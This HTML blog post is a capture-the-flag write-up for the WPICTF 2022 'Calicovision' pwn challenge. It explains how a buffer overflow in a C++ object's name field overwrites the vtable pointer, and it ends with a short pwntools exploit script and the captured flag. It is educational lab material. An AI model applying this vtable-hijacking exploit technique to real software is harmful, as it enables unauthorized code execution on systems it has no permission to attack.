<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="A simple pwn challenge from WPICTF 2022, around vtables."><title>WPICTF 2022 - PWN - Calicovision</title>
<link rel=canonical href=https://dorianb.net/blog/p/wpictf-2022-pwn-calicovision/><link rel=stylesheet href=/blog/scss/style.min.37e83f7780a7292e530518a4a182d8ebc7615fe38da324968f1786d9ff42d957.css><meta property='og:title' content="WPICTF 2022 - PWN - Calicovision"><meta property='og:description' content="A simple pwn challenge from WPICTF 2022, around vtables."><meta property='og:url' content='https://dorianb.net/blog/p/wpictf-2022-pwn-calicovision/'><meta property='og:site_name' content='Dorian B.'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='pwn'><meta property='article:tag' content='reverse'><meta property='article:published_time' content='2022-11-05T10:00:00+02:00'><meta property='article:modified_time' content='2022-11-05T10:00:00+02:00'><meta property='og:image' content='https://dorianb.net/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow.png'><meta name=twitter:title content="WPICTF 2022 - PWN - Calicovision"><meta name=twitter:description content="A simple pwn challenge from WPICTF 2022, around vtables."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://dorianb.net/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow.png'><link rel="shortcut icon" href=/blog/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/blog/><img src="https://avatars.githubusercontent.com/u/20194872?s=400&amp;u=985e4b2550b35686b0be0900b145e2740b235265&amp;v=4" width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>üêô</span></figure><div class=site-meta><h1 class=site-name><a href=/blog>Dorian B.</a></h1><h2 class=site-description>Understand, don't memorize.</h2></div></header><ol class=menu-social><li><a href=https://www.linkedin.com/in/dorian-bachelot/ target=_blank title=Linkedin rel=me><svg class="icon icon-tabler icon-tabler-brand-linkedin" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></a></li><li><a href=https://github.com/DorianBDev target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://gitlab.com/DorianBDev target=_blank title=Gitlab rel=me><svg class="icon icon-tabler icon-tabler-brand-gitlab" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M21 14l-9 7-9-7L6 3l3 7h6l3-7z"/></svg></a></li><li><a href=https://x.com/dorianbchlt target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li><li><a href=https://www.root-me.org/dorianbdev target=_blank title=RootMe rel=me><svg class="icon icon-tabler icon-tabler-skull" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 4c4.418.0 8 3.358 8 7.5.0 1.901-.755 3.637-2 4.96V19a1 1 0 01-1 1H7a1 1 0 01-1-1v-2.54c-1.245-1.322-2-3.058-2-4.96C4 7.358 7.582 4 12 4z"/><path d="M10 17v3"/><path d="M14 17v3"/><path d="M9 11m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M15 11m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></a></li><li><a href=https://app.hackthebox.com/profile/880964 target=_blank title="Hack The Box" rel=me><svg class="icon icon-tabler icon-tabler-archive" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 4m0 2a2 2 0 012-2h14a2 2 0 012 2v0a2 2 0 01-2 2H5A2 2 0 013 6z"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><path d="M10 12h4"/></svg></a></li><li><a href=https://dorianb.net/blog/index.xml target=_blank title="Rss Feed" rel=me><svg class="icon icon-tabler icon-tabler-rss" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/blog/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/blog/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/blog/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://dorianb.net><svg class="icon icon-tabler icon-tabler-arrow-back" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M9 11l-4 4 4 4m-4-4h11a4 4 0 000-8h-1"/></svg>
<span>dorianb.net</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/blog/p/wpictf-2022-pwn-calicovision/><img src=/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow_hu4909428306553206236.png srcset="/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow_hu4909428306553206236.png 800w, /blog/p/wpictf-2022-pwn-calicovision/gdb_overflow_hu15590754415474833374.png 1600w" width=800 height=439 loading=lazy alt="Featured image of post WPICTF 2022 - PWN - Calicovision"></a></div><div class=article-details><header class=article-category><a href=/blog/categories/write-up/ style=background-color:#ff3b3b;color:#fff>Write-up</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/blog/p/wpictf-2022-pwn-calicovision/>WPICTF 2022 - PWN - Calicovision</a></h2><h3 class=article-subtitle>A simple pwn challenge from WPICTF 2022, around vtables.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 05, 2022</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><p class=note>This post was written in 2022, but I had never posted it by accident. Published in October 2024.</p><h1 id=introduction>Introduction</h1><p>To continue our previous post about the WPICTF 2022 (online, hosted by <a class=link href=https://wpictf.xyz/ target=_blank rel=noopener>Worcester Polytechnic Institute Cyber Security Club</a>), we will focus our attention on a pwn challenge. And to change, this time we&rsquo;ll use <a class=link href=https://ghidra-sre.org/ target=_blank rel=noopener>Ghidra</a> rather than <a class=link href=https://cutter.re/ target=_blank rel=noopener>Cutter</a> üòé</p><p>A x64 ELF binary is provided with this challenge, no code is given.</p><h2 id=recon>Recon</h2><p>We explore the terminal user interface (TUI) of the binary, and we find the potential buffer overflow in the <code>B - Name a cat</code> submenu. Let&rsquo;s try to get the offset with <a class=link href=https://github.com/longld/peda target=_blank rel=noopener>gdb-peda</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ pattern create <span class=m>100</span>
</span></span><span class=line><span class=cl>$ r
</span></span><span class=line><span class=cl>B
</span></span><span class=line><span class=cl><span class=o>[</span>paste pattern<span class=o>]</span>
</span></span><span class=line><span class=cl>A
</span></span><span class=line><span class=cl><span class=o>[=</span>&gt; overflow <span class=o>(</span>no RIP erase<span class=o>)]</span>
</span></span><span class=line><span class=cl>$ pattern_search
</span></span><span class=line><span class=cl><span class=o>[=</span>&gt; overflow <span class=o>(</span>RAX erase and RIP pointing to call <span class=o>[</span>RAX<span class=o>])]]</span>
</span></span></code></pre></td></tr></table></div></div><p>As we can see, it will not be that trivial to exploit the vulnerability since <code>RIP</code> is not directly controlled. However, we can see that <code>RIP</code> will point to a <code>call</code> instruction, with the function address stored in <code>RAX</code>, and <code>RAX</code> retrieve this function adress from the value pointed by <code>R12</code>:</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/gdb.png width=710 height=393 srcset="/blog/p/wpictf-2022-pwn-calicovision/gdb_hu8706512429467717403.png 480w, /blog/p/wpictf-2022-pwn-calicovision/gdb_hu13832824211967393421.png 1024w" loading=lazy alt="GDB-peda view of the overflow" class=gallery-image data-flex-grow=180 data-flex-basis=433px></p><p>So, to summarize:</p><ul><li>We can change what is pointed by <code>R12</code> with the overflow,</li><li>This will change the value of <code>RAX</code>,</li><li><code>RAX</code> is then used as a function pointer in a <code>call</code>,</li></ul><p>We can translate in pseudo-code what is happening <code>call *(*(R12))</code>, or simpler:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-r data-lang=r><span class=line><span class=cl><span class=n>R12</span> <span class=o>=</span> <span class=o>&amp;</span><span class=p>(</span><span class=n>overflow[</span><span class=o>??</span><span class=n>]</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>call</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>R12</span><span class=p>)</span> <span class=o>=</span> <span class=n>call</span> <span class=o>*</span><span class=n>overflow[</span><span class=o>??</span><span class=n>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Then, we can control the flow and if we change what is pointed by <code>R12</code> to a pointer to a vulnerable code, we win.</p><p>Without reversing we already have a lot of information, but to validate our hypothesis we will have to open <a class=link href=https://ghidra-sre.org/ target=_blank rel=noopener>Ghidra</a>. We quickly find that the code is in C++ (good news) and therefore there is a lot of garbage code. We start to focus on the <code>Cat</code> structure (we can make the hypothesis that it&rsquo;s a class) and find some interesting information using the structure editor of Ghidra:</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/ghidra_cat.png width=1920 height=853 srcset="/blog/p/wpictf-2022-pwn-calicovision/ghidra_cat_hu4184377463417184320.png 480w, /blog/p/wpictf-2022-pwn-calicovision/ghidra_cat_hu16846859746573167829.png 1024w" loading=lazy alt="Reverse of the Cat structure" class=gallery-image data-flex-grow=225 data-flex-basis=540px></p><p>As we can see, the <code>Cat</code> class is composed of a <code>name</code> field of 64 bytes (where the overflow is happening) and a super interesting function pointer <code>vptr_Cat</code>. We know that this a sign of a <code>vtable</code> and confirm that <code>Cat</code> is a class, that surely deal with inheritance.</p><p>As a reminder of what a <code>vtable</code> is, let&rsquo;s read a bit of <a class=link href=https://en.wikipedia.org/wiki/Virtual_method_table target=_blank rel=noopener>Wikipedia</a>:</p><blockquote><p>In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding). Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class.</p></blockquote><blockquote><p>Typically, the compiler creates a separate virtual method table for each class. When an object is created, a pointer to this table, called the virtual table pointer, vpointer or VPTR, is added as a hidden member of this object. As such, the compiler must also generate &ldquo;hidden&rdquo; code in the constructors of each class to initialize a new object&rsquo;s virtual table pointer to the address of its class&rsquo;s virtual method table.</p></blockquote><p>Since everything is better explained with a diagram, here is one:</p><p><img src=https://www.learncpp.com/images/CppTutorial/Section12/VTable.gif loading=lazy></p><p>If you want to delve deeper into the subject, a good reference is available here: <a class=link href=http://phrack.org/issues/56/8.html target=_blank rel=noopener>SMASHING C++ VPTRS</a>. We can see the <code>vtable</code> in <code>gdb</code>:</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/gdb_vtable.png width=553 height=113 srcset="/blog/p/wpictf-2022-pwn-calicovision/gdb_vtable_hu3039902341472932292.png 480w, /blog/p/wpictf-2022-pwn-calicovision/gdb_vtable_hu16232290348715886771.png 1024w" loading=lazy alt="Vtable view in gdb" class=gallery-image data-flex-grow=489 data-flex-basis=1174px></p><p>So, we know via <code>gdb</code> that we need to deal with a function pointer to exploit the buffer overflow, and we just saw that the overflowable <code>Cat</code> class contains a <code>vptr</code>. We are close to victory, now we just have to make a choice to exploit the situation:</p><ul><li>Place our own <code>vtable</code> (pointer) in memory and make <code>R12</code> point to it,</li><li>Use the current <code>vtable</code>, but call a vulnerable function.</li></ul><p>The second option is the simplest, but we need to dig a bit more to make a definitive choice. So let&rsquo;s check the binary&rsquo;s protections:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CANARY    : ENABLED
</span></span><span class=line><span class=cl>FORTIFY   : disabled
</span></span><span class=line><span class=cl>NX        : disabled
</span></span><span class=line><span class=cl>PIE       : disabled
</span></span><span class=line><span class=cl>RELRO     : Partial
</span></span></code></pre></td></tr></table></div></div><p>That&rsquo;s good, we can use both techniques without issue (we don&rsquo;t have to deal with any canaries for this buffer overflow). Now let&rsquo;s find the offset to control <code>R12</code>:</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow.png width=1497 height=822 srcset="/blog/p/wpictf-2022-pwn-calicovision/gdb_overflow_hu15748584287749392896.png 480w, /blog/p/wpictf-2022-pwn-calicovision/gdb_overflow_hu7314462433896868516.png 1024w" loading=lazy alt="GDB view of the R12 overflow and offset" class=gallery-image data-flex-grow=182 data-flex-basis=437px></p><p>The offset is <code>64 (name) + 8 (padding)</code> to control what is pointed by <code>R12</code> and therefore <code>RAX</code>. We can now search for a vulnerable function in Ghidra by searching for a reference to <code>flag.txt</code> (CTF classic):</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/ghidra_vuln_fn.png width=1920 height=899 srcset="/blog/p/wpictf-2022-pwn-calicovision/ghidra_vuln_fn_hu2490150719442754621.png 480w, /blog/p/wpictf-2022-pwn-calicovision/ghidra_vuln_fn_hu15584830361623015374.png 1024w" loading=lazy alt="Ghidra disassembly of a function containing the flag" class=gallery-image data-flex-grow=213 data-flex-basis=512px></p><p>Vulnerable function found, in place of the <code>pet</code> function of the <code>HackerCat</code> structure. After a bit more digging in <a class=link href=https://ghidra-sre.org/ target=_blank rel=noopener>Ghidra</a>, we know that <code>HackerCat</code> inherit from the <code>Cat</code> class, and that the function <code>pet</code> is a virtual function. Therefore, to call this function the binary will use the <code>vtable</code> of the concerned object.</p><p>To call a virtual function at runtime, the binary will use this format: <code>(*(vtable_addr) + function_offset)()</code>. After a quick look in Ghidra we can find that the <code>pet</code> virtual function is not the first in the <code>vtable</code> (<code>function_offset</code> is not <code>0</code>), and therefore a call to this function will have this form:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>vptr = &amp;vtable
</span></span><span class=line><span class=cl>pet_fn_offset = ??
</span></span><span class=line><span class=cl>call [*(vptr + pet_fn_offset)]
</span></span></code></pre></td></tr></table></div></div><p>However, we found that a virtual function is called when doing <code>A - List all cats</code>, and it&rsquo;s the first in the <code>vtable</code> (<code>function_offset</code> is <code>0</code>). Therefore we end with this layout:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>vptr = &amp;vtable
</span></span><span class=line><span class=cl>call [*vptr]
</span></span></code></pre></td></tr></table></div></div><p>So we have again two possibilities:</p><ul><li>We can make an exploit using <code>C - Pet a cat</code> that will call the <code>pet</code> virtual function. This implies using the <code>vtable</code> of the <code>HackerCat</code> class to be able to call the <code>HackerCat::pet</code> win function.</li><li>We can use <code>A - List all cats</code> that call another virtual function. This implies replacing a virtual function address with <code>HackerCat::pet</code>.</li></ul><p>In a diagram this translates to (we find at the top the initial situations, and at the bottom the corresponding exploitation path):</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/exploits.png width=2602 height=1612 srcset="/blog/p/wpictf-2022-pwn-calicovision/exploits_hu7762404696403929869.png 480w, /blog/p/wpictf-2022-pwn-calicovision/exploits_hu12953671290167194003.png 1024w" loading=lazy alt="Possible exploitation paths, one per column" class=gallery-image data-flex-grow=161 data-flex-basis=387px></p><p>Both options are good, but let&rsquo;s take the second option that is simpler to debug. Let&rsquo;s retrieve the <code>vtable</code> address of <code>HackerCat</code> and the address of the pointer to <code>HackerCat::pet</code> in the same table:</p><p><img src=/blog/p/wpictf-2022-pwn-calicovision/ghidra_vtable.png width=1874 height=732 srcset="/blog/p/wpictf-2022-pwn-calicovision/ghidra_vtable_hu8906840068822777921.png 480w, /blog/p/wpictf-2022-pwn-calicovision/ghidra_vtable_hu12052454263659261997.png 1024w" loading=lazy alt="Show the vtable of HackerCat in Ghidra" class=gallery-image data-flex-grow=256 data-flex-basis=614px></p><p>Now, our plan is complete and, since there are no particular protections, we can test everything locally and find the right addresses, then we will just have to replay the same sequence on the online address. The plan is therefore as follows:</p><ul><li>We know that we can overwrite the address of the <code>vtable</code> of <code>Cat</code> objects.</li><li>We know that pointers to (virtual) functions in this <code>vtable</code> are called for <code>A - List all cats</code> and <code>C - Pet a cat</code> TUI commands.</li><li>We know that the function which will give us the flag is <code>HackerCat::pet</code>.</li><li>We know that if we replace the <code>vptr</code> pointer of a <code>Cat</code> object with the <code>HackerCat::pet</code> pointer of the <code>vtable</code> we win.</li></ul><p>So we just have to send an input in the menu &ldquo;B - Name a cat&rdquo; which contains the overflowable input with 72 bytes of garbage and then the address of the pointer to the function <code>HackerCat::pet</code>, which can be found in the vtable of <code>HackerCat</code> via <a class=link href=https://ghidra-sre.org/ target=_blank rel=noopener>Ghidra</a>. This gives us the following exploit (that is very simple, but we like overthinking here):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>LittleEndianStructure</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gc</span> <span class=kn>import</span> <span class=n>garbage</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>endian</span> <span class=o>=</span> <span class=s1>&#39;little&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;calicovision.wpi-ctf-2022-codelab.kctf.cloud&#39;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># since we can erase the vtable address, the form of the call will be (*(vtable))()</span>
</span></span><span class=line><span class=cl><span class=c1># so we need to place the address of a pointer to the right function</span>
</span></span><span class=line><span class=cl><span class=c1># to do that, we can use the vtable of the already existing object we want to use (HackerCat)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trigger the BOF</span>
</span></span><span class=line><span class=cl><span class=n>garbage</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>72</span>
</span></span><span class=line><span class=cl><span class=c1># Here we place the address of the vtable pointer to HackerCat::pet =&gt; 0x5b0078.</span>
</span></span><span class=line><span class=cl><span class=n>function_address</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x5b0078</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exploit</span> <span class=o>=</span> <span class=n>garbage</span> <span class=o>+</span> <span class=n>function_address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvlines</span><span class=p>(</span><span class=mi>13</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># B - rename cat</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;B&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># New name = exploit</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>exploit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># A - list cats</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>And we get the flag: <code>WPI{c0rrup73d_c475_cr3473_ch405}</code>.</p><p>In the end, this was very simple, but allowed us to manipulate <code>vtables</code> and many tools.</p></section><footer class=article-footer><section class=article-tags><a href=/blog/tags/pwn/>Pwn</a>
<a href=/blog/tags/reverse/>Reverse</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/blog/p/wpictf-2022-reverse-warmup/><div class=article-image><img src=/blog/p/wpictf-2022-reverse-warmup/1_cutter.707403bda8880b453f18587e6380a3df_hu10906251006218364605.png width=250 height=150 loading=lazy alt="Featured image of post WPICTF 2022 - Reverse - Warmup" data-hash="md5-cHQDvaiIC0U/GFh+Y4Cj3w=="></div><div class=article-details><h2 class=article-title>WPICTF 2022 - Reverse - Warmup</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=DorianBDev/blog data-repo-id=R_kgDOHqETOg data-category=Comments 